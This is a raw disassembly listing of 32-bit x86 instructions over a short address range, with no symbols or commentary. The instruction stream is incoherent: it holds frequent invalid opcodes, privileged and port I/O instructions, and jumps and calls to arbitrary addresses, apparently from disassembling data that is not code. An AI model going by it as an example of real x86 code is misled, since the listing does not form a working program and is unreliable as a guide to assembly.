  6b3997:	stos   BYTE PTR es:[edi],al
  6b3998:	loope  0x6b3987
  6b399a:	cmp    ecx,DWORD PTR [ebx-0x51]
  6b399d:	imul   ebx,DWORD PTR [ebp-0x7184babb],0x4f244785
  6b39a7:	push   edi
  6b39a8:	fs dec ebp
  6b39aa:	mov    ds:0x46b1ae39,al
  6b39af:	es jo  0x6b39d7
  6b39b2:	rol    ecx,cl
  6b39b4:	sub    edi,DWORD PTR [ebx-0x40e0679c]
  6b39ba:	or     ecx,DWORD PTR [esi]
  6b39bc:	sub    eax,0x986d4a1f
  6b39c1:	dec    ebx
  6b39c2:	dec    ecx
  6b39c3:	xchg   edx,eax
  6b39c4:	and    BYTE PTR [edi-0x13],0x77
  6b39c8:	sar    BYTE PTR [ebx+0x18b3a67a],0x96
  6b39cf:	sti    
  6b39d0:	jae    0x6b3a4a
  6b39d2:	add    DWORD PTR [ebp-0x54],edi
  6b39d5:	fwait
  6b39d6:	mov    ah,0x14
  6b39d8:	sar    DWORD PTR [ebx+0x2],0x8b
  6b39dc:	or     al,0x39
  6b39de:	mov    ecx,0x85ee04d0
  6b39e3:	inc    edx
  6b39e4:	rcr    BYTE PTR [esi+0x5e67561],1
  6b39ea:	div    BYTE PTR [edi+0x7981c8c2]
  6b39f0:	jle    0x6b3a4a
  6b39f2:	and    BYTE PTR [edx+0x2d08d9fd],0x6e
  6b39f9:	or     eax,DWORD PTR ds:0x52d1cd99
  6b39ff:	enter  0xb59a,0xf1
  6b3a03:	ffree  st(5)
  6b3a05:	sbb    bh,bh
  6b3a07:	jne    0x6b39a6
  6b3a09:	clc    
  6b3a0a:	jmp    0xfbfdeb77
  6b3a0f:	cwde   
  6b3a10:	xchg   edx,eax
  6b3a11:	leave  
  6b3a12:	(bad)  
  6b3a13:	push   0x62
  6b3a15:	fwait
  6b3a16:	jle    0x6b399a
  6b3a18:	or     ecx,DWORD PTR [ecx-0x2e1ad269]
  6b3a1e:	(bad)  
  6b3a1f:	(bad)  [esi]
  6b3a21:	(bad)  
  6b3a22:	push   ebp
  6b3a23:	xor    DWORD PTR [edi-0x2b1b9a6f],ecx
  6b3a29:	cmp    esi,DWORD PTR [edx+0x3ba75156]
  6b3a2f:	bswap  eax
  6b3a31:	jecxz  0x6b3a45
  6b3a33:	inc    ebp
  6b3a34:	sub    al,0x82
  6b3a36:	lods   eax,DWORD PTR ds:[esi]
  6b3a37:	sti    
  6b3a38:	(bad)
  6b3a3c:	(bad)  
  6b3a3d:	mov    bl,0xd5
  6b3a3f:	or     BYTE PTR [ebp+0x6e],bl
  6b3a42:	scas   eax,DWORD PTR es:[edi]
  6b3a43:	arpl   sp,di
  6b3a45:	xlat   BYTE PTR gs:[ebx]
  6b3a47:	jg     0x6b3a73
  6b3a49:	fimul  DWORD PTR [esi+0x4475aa85]
  6b3a4f:	adc    eax,DWORD PTR [eax]
  6b3a51:	dec    ebx
  6b3a52:	xchg   DWORD PTR [ebx+0x24545415],edx
  6b3a58:	mov    ds:0xb2eb6190,al
  6b3a5d:	inc    esp
  6b3a5e:	xor    ch,BYTE PTR [ebp-0x2ac22350]
  6b3a64:	stos   BYTE PTR es:[edi],al
  6b3a65:	(bad)  
  6b3a66:	mov    dl,0xd5
  6b3a68:	sub    DWORD PTR [edx],edi
  6b3a6a:	push   ecx
  6b3a6b:	retf   0x161
  6b3a6e:	sar    DWORD PTR [ebx+0x2d88da7c],0x92
  6b3a75:	or     al,0x23
  6b3a77:	fild   DWORD PTR [ecx]
  6b3a79:	xchg   DWORD PTR [eax-0x52],edi
  6b3a7c:	pop    es
  6b3a7d:	icebp  
  6b3a7e:	mov    edx,0x8fb4b4aa
  6b3a83:	jle    0x6b3a68
  6b3a85:	jl     0x6b3a10
  6b3a87:	mov    cl,BYTE PTR [edx]
  6b3a89:	xor    ah,dh
  6b3a8b:	push   cs
  6b3a8c:	xor    bl,BYTE PTR [eax]
  6b3a8e:	mov    ch,0x24
  6b3a90:	test   BYTE PTR [ebp+0x53],0xfa
  6b3a94:	cmp    ch,ch
  6b3a96:	cmp    dl,bh
  6b3a98:	pusha  
  6b3a99:	(bad)  
  6b3a9a:	out    0x9b,al
  6b3a9c:	ret    0x9ae7
  6b3a9f:	jmp    0x6b3ae9
  6b3aa1:	dec    ebx
  6b3aa2:	mov    eax,0x4b150487
  6b3aa7:	es stos BYTE PTR es:[edi],al
  6b3aa9:	not    dl
  6b3aab:	enter  0x62b2,0xa7
  6b3aaf:	mov    eax,ds:0xbffb51f8
  6b3ab4:	dec    edi
  6b3ab5:	sub    edx,eax
  6b3ab7:	repnz in eax,0xb8
  6b3aba:	and    bh,dl
  6b3abc:	lahf   
  6b3abd:	add    ah,ch
  6b3abf:	int    0x67
  6b3ac1:	fcomp  st(3)
  6b3ac3:	ret    0x77a6
  6b3ac6:	addr16 xchg ecx,eax
  6b3ac8:	xchg   esi,eax
  6b3ac9:	pop    es
  6b3aca:	ds sub al,0x38
  6b3acd:	sbb    DWORD PTR ds:0xa00590c4,edi
  6b3ad3:	push   esp
  6b3ad4:	in     eax,dx
  6b3ad5:	shl    DWORD PTR [ecx],1
  6b3ad7:	rcr    DWORD PTR [ebx],0x8e
  6b3ada:	xchg   BYTE PTR [ecx],bl
  6b3adc:	inc    ebp
  6b3add:	mov    DWORD PTR [edi+0x53986ebb],edi
  6b3ae3:	jae    0x6b3abb
  6b3ae5:	jmp    0x6b3ab2
  6b3ae7:	loope  0x6b3b12
  6b3ae9:	pop    eax
  6b3aea:	dec    ebx
  6b3aeb:	stc    
  6b3aec:	jae    0x6b3a75
  6b3aee:	dec    ebp
  6b3aef:	or     ebp,ebp
  6b3af1:	cmp    al,BYTE PTR [edx]
  6b3af3:	sbb    eax,0x8d99a889
  6b3af8:	jo     0x6b3a9c
  6b3afa:	xor    al,0x13
  6b3afc:	pop    ebx
  6b3afd:	sub    al,0xae
  6b3aff:	js     0x6b3ab1
  6b3b01:	repnz mov edx,0xa984acea
  6b3b07:	add    ah,BYTE PTR [ebp+0x7775168f]
  6b3b0d:	xor    al,0xe7
  6b3b0f:	mov    bh,0x3f
  6b3b11:	mov    ecx,0x4e7ce5ac
  6b3b16:	jno    0x6b3ab9
  6b3b18:	sub    eax,0x9f2d2797
  6b3b1d:	call   0x2168468b
  6b3b22:	call   FWORD PTR [ecx+0x2c]
  6b3b25:	mov    esi,0xce1ea32f
  6b3b2a:	aaa    
  6b3b2b:	js     0x6b3b73
  6b3b2d:	sar    DWORD PTR [esp+edi*2-0x46],0xb
  6b3b32:	fstp   QWORD PTR [ecx-0x553f607c]
  6b3b38:	adc    edx,ebp
  6b3b3a:	push   0x21
  6b3b3c:	adc    BYTE PTR [edx+0x6af666c4],bl
  6b3b42:	xor    BYTE PTR [ebx],al
  6b3b44:	ds and eax,0xde9c10f
  6b3b4a:	push   cs
  6b3b4b:	inc    ebx
  6b3b4c:	repz call 0x54b9cd2b
  6b3b52:	repz mov es,WORD PTR [esi+0x7bfede8e]
  6b3b59:	nop
  6b3b5a:	xchg   esi,eax
  6b3b5b:	fistp  WORD PTR ds:0x6a4f8f89
  6b3b61:	mov    dl,0x7c
  6b3b63:	shr    BYTE PTR [ecx+edx*1],cl
  6b3b66:	fwait
  6b3b67:	adc    esi,DWORD PTR [ebx]
  6b3b69:	popa   
  6b3b6a:	ret    
  6b3b6b:	dec    edx
  6b3b6c:	lods   eax,DWORD PTR ds:[esi]
  6b3b6d:	xor    al,0x61
  6b3b6f:	xchg   BYTE PTR [eax],dh
  6b3b71:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  6b3b73:	fisubr DWORD PTR [edx]
  6b3b75:	mov    ebp,0x7902ac2c
  6b3b7a:	mov    al,ds:0x4c9a79d0
  6b3b7f:	daa    
  6b3b80:	inc    ecx
  6b3b81:	jno    0x6b3b95
  6b3b83:	mov    eax,ds:0x84ed602a
  6b3b88:	retf   0xc9f9
  6b3b8b:	pop    ss
  6b3b8c:	fimul  WORD PTR [ecx]
  6b3b8e:	or     al,0x44
  6b3b90:	dec    eax
  6b3b91:	fs dec esi
  6b3b93:	inc    BYTE PTR [edx+0x30b0f79c]
  6b3b99:	lods   al,BYTE PTR ds:[esi]
  6b3b9a:	mov    bh,bl
  6b3b9c:	imul   edi,DWORD PTR [ecx],0x7f
  6b3b9f:	scas   eax,DWORD PTR es:[edi]
  6b3ba0:	cs std 
  6b3ba2:	stos   BYTE PTR es:[edi],al
  6b3ba3:	xchg   esp,eax
  6b3ba4:	xchg   ebx,eax
  6b3ba5:	mov    esi,0x82772c4
  6b3baa:	push   esi
  6b3bab:	sub    ebx,ecx
  6b3bad:	mov    DWORD PTR [edx+0x7e],0xb91e3ec9
  6b3bb4:	add    BYTE PTR [edx+esi*8],0x48
  6b3bb8:	nop
  6b3bb9:	push   cs
  6b3bba:	add    al,0x6
  6b3bbc:	xchg   edi,eax
  6b3bbd:	sar    BYTE PTR [ecx-0x5e],cl
  6b3bc0:	xlat   BYTE PTR ds:[ebx]
  6b3bc1:	cdq    
  6b3bc2:	fcmovbe st,st(6)
  6b3bc4:	stc    
  6b3bc5:	jecxz  0x6b3b5e
  6b3bc7:	cmp    al,0xb7
  6b3bc9:	inc    eax
  6b3bca:	sqrtps xmm2,XMMWORD PTR [edx+eiz*4-0x17]
  6b3bcf:	mov    ecx,0x2c1ac239
  6b3bd4:	xlat   BYTE PTR ds:[ebx]
  6b3bd5:	push   ecx
  6b3bd6:	push   ds
  6b3bd7:	mov    fs,WORD PTR [ecx]
  6b3bd9:	fs inc edx
  6b3bdc:	scas   eax,DWORD PTR es:[edi]
  6b3bdd:	sub    cl,ch
  6b3bdf:	cmc    
  6b3be0:	bound  esi,QWORD PTR [eax]
  6b3be2:	mov    ds:0x9dbbf35c,al
  6b3be7:	or     eax,0xbe541d54
  6b3bec:	scas   eax,DWORD PTR es:[edi]
  6b3bed:	lds    ebx,FWORD PTR [ebp+0x6b5f538f]
  6b3bf3:	mov    BYTE PTR [eax+0x57c9c466],bl
  6b3bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b3bfa:	inc    eax
  6b3bfb:	add    eax,0x75469830
  6b3c00:	push   ecx
  6b3c01:	inc    esp
  6b3c02:	leave  
  6b3c03:	ja     0x6b3c70
  6b3c05:	xchg   esi,eax
  6b3c06:	pushf  
  6b3c07:	int    0x23
  6b3c09:	mov    eax,ds:0xa3a00764
  6b3c0e:	dec    edx
  6b3c0f:	dec    esp
  6b3c10:	ss pop es
  6b3c12:	adc    dl,BYTE PTR [ebx]
  6b3c14:	lods   eax,DWORD PTR ds:[esi]
  6b3c15:	xor    dh,bh
  6b3c17:	pop    edx
  6b3c18:	das    
  6b3c19:	cmp    dh,cl
  6b3c1b:	gs jl  0x6b3c6d
  6b3c1e:	cdq    
  6b3c1f:	xchg   ecx,eax
  6b3c20:	pop    edx
  6b3c21:	dec    esp
  6b3c22:	aas    
  6b3c23:	mov    al,0x54
  6b3c25:	dec    edx
  6b3c26:	or     al,0x7d
  6b3c28:	ds in  eax,0xb7
  6b3c2b:	inc    esi
  6b3c2c:	movntps XMMWORD PTR [ecx+0x64],xmm0
  6b3c30:	pop    esi
  6b3c31:	jae    0x6b3c27
  6b3c33:	mov    eax,0x299d16ae
  6b3c38:	test   BYTE PTR [ebp-0x13ca5281],bh
  6b3c3e:	int    0xb1
  6b3c40:	sub    al,0x4d
  6b3c42:	and    edi,ebx
  6b3c44:	imul   BYTE PTR [edx-0x36bc93a1]
  6b3c4a:	lods   al,BYTE PTR ds:[esi]
  6b3c4b:	stos   BYTE PTR es:[edi],al
  6b3c4c:	ja     0x6b3beb
  6b3c4e:	arpl   WORD PTR [ecx],cx
  6b3c50:	pop    ecx
  6b3c51:	ret    0xdf2f
  6b3c54:	and    eax,0x24feee46
  6b3c59:	adc    ebx,esi
  6b3c5b:	adc    eax,0xe2ee2ea7
  6b3c60:	sbb    DWORD PTR [esi+edi*2-0x4e],ecx
  6b3c64:	in     al,0xc2
  6b3c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3c67:	mov    WORD PTR ds:0x7b5d2096,gs
  6b3c6d:	int3   
  6b3c6e:	push   ecx
  6b3c6f:	fst    DWORD PTR [edi-0x41]
  6b3c72:	pusha  
  6b3c73:	xchg   ebp,eax
  6b3c74:	jnp    0x6b3c3f
  6b3c76:	pop    ebp
  6b3c77:	cli    
  6b3c78:	pop    esp
  6b3c79:	mov    BYTE PTR [ecx+0x1cbaa31e],dh
  6b3c7f:	pop    esp
  6b3c80:	adc    edi,DWORD PTR [edi+0x62715b72]
  6b3c86:	loopne 0x6b3cdd
  6b3c88:	xchg   esp,eax
  6b3c89:	pop    ecx
  6b3c8a:	cmp    eax,0x506c9610
  6b3c8f:	aad    0x4c
  6b3c91:	shl    BYTE PTR [ecx+0x6ce2b3ec],cl
  6b3c97:	mov    ebp,0x90a58f02
  6b3c9c:	test   eax,0x74929d04
  6b3ca1:	mov    DWORD PTR [ebx+0x18],ecx
  6b3ca4:	lds    edx,FWORD PTR [edx+0x429b54f2]
  6b3caa:	pop    ss
  6b3cab:	mov    ch,0x3
  6b3cad:	or     DWORD PTR [ebp-0x61],edi
  6b3cb0:	sub    eax,0xf27e0d33
  6b3cb5:	call   0xd61a6d9a
  6b3cba:	fsub   DWORD PTR [ecx]
  6b3cbc:	jb     0x6b3c7e
  6b3cbe:	aad    0x87
  6b3cc0:	mov    esi,fs
  6b3cc2:	and    al,0x99
  6b3cc4:	cld    
  6b3cc5:	pop    ds
  6b3cc6:	in     eax,dx
  6b3cc7:	mov    esi,0xa3d02d9c
  6b3ccc:	jp     0x6b3ce0
  6b3cce:	popa   
  6b3ccf:	push   esi
  6b3cd0:	outs   dx,BYTE PTR ds:[esi]
  6b3cd1:	scas   eax,DWORD PTR es:[edi]
  6b3cd2:	(bad)  
  6b3cd4:	jne    0x6b3c9a
  6b3cd6:	clc    
  6b3cd7:	ret    
  6b3cd8:	xchg   ecx,eax
  6b3cd9:	jmp    0x5e9187bf
  6b3cde:	cmp    eax,0xa1ee83be
  6b3ce3:	cld    
  6b3ce4:	popf   
  6b3ce5:	mov    ebx,0xd597c19f
  6b3cea:	imul   DWORD PTR [eax+eiz*8-0x114c5b1e]
  6b3cf1:	mov    eax,0x194c3b2f
  6b3cf6:	retf   0x32f9
  6b3cf9:	enter  0xdb77,0xdd
  6b3cfd:	ss jns 0x6b3c82
  6b3d00:	dec    edx
  6b3d01:	call   0x8a10:0xce3347d0
  6b3d08:	aaa    
  6b3d09:	fcmovne st,st(1)
  6b3d0b:	sbb    ebx,ebx
  6b3d0d:	push   eax
  6b3d0e:	retf   0x2802
  6b3d11:	jmp    0xf57a:0xdc9a2684
  6b3d18:	das    
  6b3d19:	push   ds
  6b3d1a:	mov    ds:0x180baad,eax
  6b3d1f:	retf   
  6b3d20:	sub    bl,BYTE PTR [esi+esi*1-0x7aef7ca9]
  6b3d27:	out    0xc6,al
  6b3d29:	dec    ebx
  6b3d2a:	xchg   esp,eax
  6b3d2b:	mov    ebx,0xdff59f30
  6b3d30:	cmp    BYTE PTR es:[edi],ch
  6b3d33:	mov    ebp,0x47984b7c
  6b3d38:	enter  0xc7ff,0xca
  6b3d3c:	sar    DWORD PTR [ecx],0xee
  6b3d3f:	xchg   ecx,eax
  6b3d40:	mov    BYTE PTR [edi+0x59],0xeb
  6b3d44:	pop    ecx
  6b3d45:	push   edx
  6b3d46:	call   0x65422cf1
  6b3d4b:	outs   dx,BYTE PTR ds:[esi]
  6b3d4c:	dec    BYTE PTR [edx+0x1910d4f7]
  6b3d52:	mov    esi,0x22389914
  6b3d57:	popa   
  6b3d58:	ja     0x6b3d2a
  6b3d5a:	pop    esi
  6b3d5b:	cmp    eax,0xb5a8bd0e
  6b3d60:	mov    dh,0x2e
  6b3d62:	mov    ds,ebp
  6b3d64:	mov    eax,0x86dd4cca
  6b3d6a:	dec    edi
  6b3d6c:	or     al,0x65
  6b3d6e:	test   DWORD PTR [ebx],0xf440f623
  6b3d74:	test   al,0xb2
  6b3d76:	push   ebx
  6b3d77:	lahf   
  6b3d78:	mov    edx,0x38d0db20
  6b3d7d:	aas    
  6b3d7e:	test   al,0x65
  6b3d80:	add    eax,0x7aa13cd1
  6b3d85:	jmp    0x367f009d
  6b3d8a:	sub    al,0xe9
  6b3d8c:	ss iret 
  6b3d8e:	cmc    
  6b3d8f:	es stc 
  6b3d91:	shl    DWORD PTR [eax+0x42],1
  6b3d94:	jnp    0x6b3dcf
  6b3d96:	mov    bl,0x20
  6b3d98:	or     BYTE PTR [edi-0x3],ah
  6b3d9b:	(bad)  
  6b3d9c:	push   ebp
  6b3d9d:	scas   eax,DWORD PTR es:[edi]
  6b3d9e:	mov    eax,0x1b948839
  6b3da3:	aam    0x42
  6b3da5:	pushf  
  6b3da6:	imul   edx,DWORD PTR [edi+0x6f2d6f6f],0xffffff85
  6b3dad:	outs   dx,BYTE PTR gs:[esi]
  6b3daf:	xchg   DWORD PTR [esi],edx
  6b3db1:	push   ebx
  6b3db2:	nop
  6b3db3:	xor    BYTE PTR ds:0xb6f192bd,cl
  6b3db9:	push   cs
  6b3dba:	xchg   esp,eax
  6b3dbb:	lahf   
  6b3dbc:	mov    esp,0xd6f5d12e
  6b3dc1:	fidivr WORD PTR [ebx]
  6b3dc3:	push   0x25
  6b3dc5:	fild   WORD PTR [ebx-0x5]
  6b3dc8:	loope  0x6b3d6b
  6b3dca:	test   BYTE PTR [ebx],cl
  6b3dcc:	out    0xca,al
  6b3dce:	imul   eax,DWORD PTR [eax+edi*8],0x5807b347
  6b3dd5:	in     eax,dx
  6b3dd6:	retf   0x636d
  6b3dd9:	lods   eax,DWORD PTR ds:[esi]
  6b3dda:	mov    BYTE PTR [eax-0x2e3e7ba4],ah
  6b3de0:	ret    
  6b3de1:	nop
  6b3de2:	or     al,0xc3
  6b3de4:	retf   0x20c9
  6b3de7:	rcl    DWORD PTR [edx+ebx*4],0xd8
  6b3deb:	push   ebp
  6b3dec:	shl    ecx,0xf9
  6b3def:	xchg   ecx,eax
  6b3df0:	shl    DWORD PTR [ebx-0x18],cl
  6b3df3:	pop    ss
  6b3df4:	xor    al,BYTE PTR [ecx]
  6b3df6:	cmp    esp,esp
  6b3df8:	sti    
  6b3df9:	or     BYTE PTR [ebx-0x2a],dl
  6b3dfc:	sahf   
  6b3dfd:	iret   
  6b3dfe:	bsf    esi,DWORD PTR [edi-0x1e]
  6b3e02:	jmp    0x57d3:0xa8a08ca4
  6b3e09:	sar    DWORD PTR [eax+0x46dfd065],0x1a
  6b3e10:	fcmovnu st,st(5)
  6b3e12:	push   ss
  6b3e13:	retf   
  6b3e14:	xchg   edx,eax
  6b3e15:	mov    dh,0xb3
  6b3e17:	pop    edx
  6b3e18:	sub    BYTE PTR [edi],bh
  6b3e1a:	inc    esi
  6b3e1b:	ficomp DWORD PTR [eax]
  6b3e1d:	mov    ebp,0x4f7c3b31
  6b3e22:	pop    eax
  6b3e23:	xchg   ebp,eax
  6b3e24:	add    eax,0xf9ba832
  6b3e29:	mov    BYTE PTR [esi-0x19],cl
  6b3e2c:	outs   dx,BYTE PTR ds:[esi]
  6b3e2d:	stos   BYTE PTR es:[edi],al
  6b3e2e:	sbb    DWORD PTR [ebx-0x419d6fbe],eax
  6b3e34:	in     al,0x60
  6b3e36:	mov    ah,0x5
  6b3e38:	test   eax,0xbe66baba
  6b3e3d:	xchg   edi,eax
  6b3e3e:	add    al,0xff
  6b3e40:	and    cl,BYTE PTR [ecx]
  6b3e42:	dec    ebx
  6b3e43:	outs   dx,BYTE PTR ds:[esi]
  6b3e44:	mov    al,0xbf
  6b3e46:	gs mov esi,0x9c596527
  6b3e4c:	add    BYTE PTR [esi],dh
  6b3e4e:	xchg   BYTE PTR [eax-0x3b],ah
  6b3e51:	xlat   BYTE PTR ds:[ebx]
  6b3e52:	push   es
  6b3e53:	mov    bh,BYTE PTR [ebx+esi*1-0x42]
  6b3e57:	xor    eax,0x129eeddc
  6b3e5c:	jge    0x6b3eb9
  6b3e5e:	not    DWORD PTR [edx]
  6b3e60:	cmc    
  6b3e61:	jmp    0x6b3eb0
  6b3e63:	cdq    
  6b3e64:	ss jp  0x6b3e35
  6b3e67:	cli    
  6b3e68:	cmp    BYTE PTR [ebx-0x43],al
  6b3e6b:	and    DWORD PTR [esi],esi
  6b3e6d:	cmp    bh,0x21
  6b3e70:	js     0x6b3e98
  6b3e72:	push   ecx
  6b3e73:	xchg   esi,eax
  6b3e74:	or     BYTE PTR [ecx+0x60],0x92
  6b3e78:	lahf   
  6b3e79:	fsubr  QWORD PTR [edx+ebp*4-0x6615f4c]
  6b3e80:	mov    al,0x63
  6b3e82:	jle    0x6b3edd
  6b3e84:	aad    0x77
  6b3e86:	imul   BYTE PTR [edx+0x12]
  6b3e89:	dec    ebx
  6b3e8a:	mov    al,ds:0x352cb137
  6b3e8f:	cs push edi
  6b3e91:	adc    ebx,DWORD PTR [ebx-0x2a]
  6b3e94:	fidivr WORD PTR [edx-0x47]
  6b3e97:	mov    dl,0x4b
  6b3e99:	xchg   edi,eax
  6b3e9a:	inc    ebp
  6b3e9b:	push   ss
  6b3e9c:	call   0x771a0a21
  6b3ea1:	mov    esp,0xccefa59a
  6b3ea6:	add    DWORD PTR [edi-0x68],esi
  6b3ea9:	inc    ecx
  6b3eaa:	mov    DWORD PTR [edx+0x45],eax
  6b3ead:	pop    edi
  6b3eae:	mov    ah,0xb0
  6b3eb0:	dec    edi
  6b3eb1:	xchg   edi,eax
  6b3eb2:	pop    ebx
  6b3eb3:	lods   eax,DWORD PTR ds:[esi]
  6b3eb4:	(bad)  
  6b3eb6:	sbb    eax,0x2e0c40da
  6b3ebb:	int3   
  6b3ebc:	sub    dh,cl
  6b3ebe:	out    0xb5,al
  6b3ec0:	sbb    cl,BYTE PTR [esi+0x64]
  6b3ec3:	mov    ecx,0xec534580
  6b3ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b3ec9:	xor    BYTE PTR [ebp-0x7ce318ce],dh
  6b3ecf:	dec    edx
  6b3ed0:	pop    edx
  6b3ed1:	push   esi
  6b3ed2:	and    esi,eax
  6b3ed4:	adc    esi,DWORD PTR [ebx]
  6b3ed6:	pop    ebx
  6b3ed7:	ret    
  6b3ed8:	aas    
  6b3ed9:	dec    esi
  6b3eda:	pop    ds
  6b3edb:	dec    esi
  6b3edc:	ins    DWORD PTR es:[edi],dx
  6b3edd:	mov    ds:0x79bdd2bb,eax
  6b3ee2:	jecxz  0x6b3ef6
  6b3ee4:	or     eax,0xf13db0be
  6b3ee9:	push   0x1e3d10c5
  6b3eee:	enter  0xe95c,0x3b
  6b3ef2:	adc    BYTE PTR [ebp-0x7a45581],ah
  6b3ef8:	(bad)  
  6b3ef9:	jnp    0x6b3f2c
  6b3efb:	sub    DWORD PTR [edi+ebx*4],0xab8e4502
  6b3f02:	mov    bh,0xe0
  6b3f04:	xchg   si,ax
  6b3f06:	ret    
  6b3f07:	iret   
  6b3f08:	adc    bh,bh
  6b3f0a:	pop    esi
  6b3f0b:	retf   0x65fa
  6b3f0e:	push   es
  6b3f0f:	jnp    0x6b3f84
  6b3f11:	jmp    0xcb5eec68
  6b3f16:	xchg   edx,eax
  6b3f17:	gs inc ebp
  6b3f19:	or     DWORD PTR [ebx],ebp
  6b3f1b:	aad    0x8b
  6b3f1d:	mov    dl,0x1
  6b3f1f:	sbb    eax,0x9abf702c
  6b3f24:	test   BYTE PTR [eax+0x6b056f2c],bl
  6b3f2a:	push   0x56902587
  6b3f2f:	stos   DWORD PTR es:[edi],eax
  6b3f30:	bts    DWORD PTR [ecx],edi
  6b3f33:	jecxz  0x6b3f43
  6b3f35:	cmc    
  6b3f36:	fisub  WORD PTR [esi-0x7d]
  6b3f39:	pop    es
  6b3f3a:	cmp    BYTE PTR [edx+0x20e30606],bh
  6b3f40:	ins    DWORD PTR es:[edi],dx
  6b3f41:	dec    esp
  6b3f42:	aam    0x26
  6b3f44:	jb     0x6b3f67
  6b3f46:	pop    edx
  6b3f47:	or     bl,dh
  6b3f49:	sbb    cl,al
  6b3f4b:	mov    ebp,0x5d31ae14
  6b3f50:	aam    0xa7
  6b3f52:	fs xchg edx,eax
  6b3f54:	sbb    eax,0x877c0ed2
  6b3f59:	ss call 0x299:0x7f9e667a
  6b3f61:	adc    dh,dh
  6b3f63:	lock jl 0x6b3f19
  6b3f66:	out    dx,eax
  6b3f67:	mov    al,ds:0x16bea724
  6b3f6c:	add    eax,0x3cd07c12
  6b3f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3f72:	mov    ebp,0xf8b5714b
  6b3f77:	adc    DWORD PTR [edx+0x39],ebx
  6b3f7a:	dec    edx
  6b3f7b:	lods   eax,DWORD PTR ds:[esi]
  6b3f7c:	fsubr  st,st(3)
  6b3f7e:	fist   DWORD PTR [ebx+ecx*8-0x75]
  6b3f82:	rcl    ebp,0xfb
  6b3f85:	adc    BYTE PTR [eax+0x352fb705],bh
  6b3f8b:	sub    ebx,DWORD PTR [esi-0x1d485ac3]
  6b3f91:	in     eax,dx
  6b3f92:	xchg   ebx,eax
  6b3f93:	mov    ah,0x79
  6b3f95:	inc    esp
  6b3f96:	push   es
  6b3f97:	xor    eax,0xc1f07721
  6b3f9c:	jp     0x6b3ffd
  6b3f9e:	or     DWORD PTR [esi+0x1595faff],0x1a
  6b3fa5:	lea    ecx,[edx+0x1baf88ab]
  6b3fab:	cld    
  6b3fac:	jmp    0x446d:0x6fe972bd
  6b3fb3:	and    cl,cl
  6b3fb5:	ds pop edx
  6b3fb7:	mov    ss,WORD PTR [esi-0x9]
  6b3fba:	pop    esi
  6b3fbb:	pushf  
  6b3fbc:	(bad)  
  6b3fbd:	dec    esi
  6b3fbe:	pop    ebx
  6b3fbf:	lods   eax,DWORD PTR ds:[esi]
  6b3fc0:	mov    ecx,DWORD PTR [esi+eax*4-0xa7006ab]
  6b3fc7:	sbb    ecx,DWORD PTR [esi-0x24199ee5]
  6b3fcd:	addr16 cs ror dl,1
  6b3fd1:	or     eax,0x8ff6c29e
  6b3fd6:	not    esp
  6b3fd8:	cmp    BYTE PTR [edx+0x22],al
  6b3fdb:	gs push esi
  6b3fdd:	imul   ebx,ecx,0x7f8b32f4
  6b3fe3:	fdivrp st(4),st
  6b3fe5:	jns    0x6b3f85
  6b3fe7:	mov    eax,0x138acdd2
  6b3fec:	and    esp,DWORD PTR [edi+edi*1]
  6b3fef:	int3   
  6b3ff0:	dec    esp
  6b3ff1:	pop    esi
  6b3ff2:	mov    eax,0x183bbf5a
  6b3ff7:	sti    
  6b3ff8:	or     DWORD PTR [esi+eax*1-0x4c290ea5],esp
  6b3fff:	pop    es
  6b4000:	inc    edi
  6b4001:	nop
  6b4002:	retf   
  6b4003:	pop    eax
  6b4004:	scas   al,BYTE PTR es:[edi]
  6b4005:	inc    esi
  6b4006:	xchg   BYTE PTR [ecx-0x37],dl
  6b4009:	(bad)  
  6b400a:	and    edx,DWORD PTR [edx]
  6b400c:	je     0x6b3ff0
  6b400e:	(bad)  
  6b400f:	popf   
  6b4010:	mov    dl,0x6d
  6b4012:	cld    
  6b4013:	dec    edx
  6b4014:	and    al,0xfb
  6b4016:	adc    eax,0x6a3d1ab0
  6b401b:	sbb    dl,0x75
  6b401e:	xchg   BYTE PTR [ebx-0x3a],bl
  6b4021:	push   esp
  6b4022:	rep stos DWORD PTR es:[edi],eax
  6b4024:	ret    0x7e7f
  6b4027:	ss lahf 
  6b4029:	push   0xc5df331f
  6b402e:	out    0xd1,eax
  6b4030:	idiv   cl
  6b4032:	sub    cl,BYTE PTR [esi+0xc791526]
  6b4038:	pmaddwd mm3,QWORD PTR [ecx+0x36]
  6b403c:	add    al,0x62
  6b403e:	dec    esp
  6b403f:	cwde   
  6b4040:	adc    DWORD PTR [ebp+0x34],0xffffffe3
  6b4044:	je     0x6b4066
  6b4046:	adc    BYTE PTR [esi+edx*2+0xc],dl
  6b404a:	pop    ds
  6b404b:	outs   dx,BYTE PTR ds:[si]
  6b404e:	pop    ebp
  6b404f:	inc    ebx
  6b4050:	mov    esi,0x53655b32
  6b4055:	(bad)  
  6b4056:	jmp    0x99a9:0x9638339b
  6b405d:	mov    ?,WORD PTR [ebp+0x3d]
  6b4060:	shr    BYTE PTR [eax],1
  6b4062:	lods   al,BYTE PTR ds:[esi]
  6b4063:	inc    esi
  6b4064:	imul   edi,DWORD PTR [ebp+0x47],0xbd6cd064
  6b406b:	cmp    ebx,0x67
  6b406e:	aam    0xd9
  6b4070:	mov    bh,0xf3
  6b4072:	int3   
  6b4073:	aas    
  6b4074:	sub    eax,0x95b9be67
  6b4079:	jmp    0xaf4dd068
  6b407e:	je     0x6b40ba
  6b4080:	cmc    
  6b4081:	fimul  WORD PTR [edi+0x4eb4da3]
  6b4087:	cld    
  6b4088:	pop    esi
  6b4089:	jb     0x6b4038
  6b408b:	xor    BYTE PTR [eax+0x6eb5ea7],ch
  6b4091:	mov    ecx,0x50785426
  6b4096:	xlat   BYTE PTR ds:[ebx]
  6b4097:	mov    edx,0x465e971
  6b409c:	or     al,0x40
  6b409e:	popa   
  6b409f:	inc    edi
  6b40a0:	cmp    ecx,ebp
  6b40a2:	hlt    
  6b40a3:	shl    DWORD PTR [esp+ecx*1],1
  6b40a6:	or     esi,0x89790c
  6b40ac:	mov    ch,0x68
  6b40ae:	stc    
  6b40af:	(bad)  
  6b40b0:	mov    ebx,0x8c97bb9d
  6b40b5:	mov    ds:0x6bd098cb,al
  6b40ba:	fdivr  st,st(7)
  6b40bc:	jle    0x6b4138
  6b40be:	out    dx,eax
